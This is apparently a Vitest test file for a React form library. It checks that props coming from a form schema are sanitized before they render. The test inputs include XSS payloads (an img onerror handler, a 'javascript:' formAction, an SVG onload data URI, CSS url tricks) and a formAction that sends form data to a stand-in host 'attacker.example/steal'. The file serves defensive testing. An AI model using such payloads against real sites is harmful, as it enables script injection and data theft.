import { describe, expect, it, vi } from 'vitest';
import { render } from '@testing-library/react';
import { FormFactory } from './form-factory';
import type { FormSchema } from '@schepta/core';

function formWithSection(componentProps: Record<string, unknown>): FormSchema {
  return {
    $id: 'security-form', type: 'object', 'x-component': 'FormContainer', properties: {
      section: { type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 }, 'x-component-props': componentProps, properties: {} },
    },
  } as FormSchema;
}

describe('schema DOM prop sanitization', () => {
  it('does not render React HTML parsing props from a FormFactory schema', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const { container } = render(
      <FormFactory schema={formWithSection({ dangerouslySetInnerHTML: { __html: '<img src=x onerror=alert(1)>' } })} />
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    warn.mockRestore();
  });

  it('sanitizes nested component prop bags before default inputs spread them', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const { container } = render(
      <FormFactory schema={{
        $id: 'nested-security-form',
        type: 'object',
        'x-component': 'FormContainer',
        properties: {
          section: {
            type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 },
            properties: {
              groups: {
                type: 'object', 'x-component': 'FormSectionGroupContainer',
                properties: {
                  group: {
                    type: 'object', 'x-component': 'FormSectionGroup',
                    properties: {
                      submit: {
                        type: 'object', 'x-component': 'FormField', 'x-ui': { order: 1 },
                        properties: {
                          submit: { type: 'string', 'x-component': 'InputText', 'x-component-props': { 'x-component-props': { type: 'submit', formAction: 'javascript:alert(1)' } } },
                        },
                      },
                    },
                  },
                },
              },
            },
          },
        },
      } as FormSchema} />
    );

    const input = container.querySelector('input');
    expect(input).not.toBeNull();
    expect(input?.getAttribute('formaction')).toBeNull();
    expect(container.innerHTML).not.toContain('javascript:');
    warn.mockRestore();
  });

  it('keeps legitimate schema props', () => {
    const { container } = render(
      <FormFactory schema={formWithSection({ title: 'Safe title', 'data-test-id': 'safe-section' })} />
    );

    expect(container.querySelector('[data-test-id="safe-section"]')).toHaveAttribute('title', 'Safe title');
  });

  it('drops schema ref and key props before React renders them', () => {
    expect(() => render(
      <FormFactory schema={formWithSection({ ref: 'schema-ref', key: 'schema-key' })} />
    )).not.toThrow();
  });

  it('applies the tag-aware URL, style and form-target rules in default components', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const field = (props: Record<string, unknown>) => ({
      $id: 'default-sinks', type: 'object', 'x-component': 'FormContainer', properties: {
        section: {
          type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 },
          properties: {
            groups: {
              type: 'object', 'x-component': 'FormSectionGroupContainer',
              properties: {
                group: {
                  type: 'object', 'x-component': 'FormSectionGroup',
                  properties: {
                    submit: {
                      type: 'object', 'x-component': 'FormField', 'x-ui': { order: 1 },
                      properties: { submit: { type: 'string', 'x-component': 'InputText', 'x-component-props': props } },
                    },
                  },
                },
              },
            },
          },
        },
      },
    } as unknown as FormSchema);

    for (const props of [
      { type: 'submit', formAction: 'https://attacker.example/steal' },
      { type: 'image', src: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(origin)"/>' },
      { style: { backgroundImage: 'image-set("https://attacker.example/x.png" 1x)' } },
      { style: { backgroundImage: '\\75rl(https://attacker.example/y.png)' } },
    ]) {
      const { container, unmount } = render(<FormFactory schema={field(props)} />);
      const input = container.querySelector('input');
      expect(input).not.toBeNull();
      expect(input?.getAttribute('formaction')).toBeNull();
      expect(input?.getAttribute('src')).toBeNull();
      expect(container.innerHTML).not.toContain('attacker.example');
      unmount();
    }

    const { container } = render(<FormFactory schema={field({ type: 'submit', formAction: '/save' })} />);
    expect(container.querySelector('input')).toHaveAttribute('formaction', '/save');
    warn.mockRestore();
  });
});
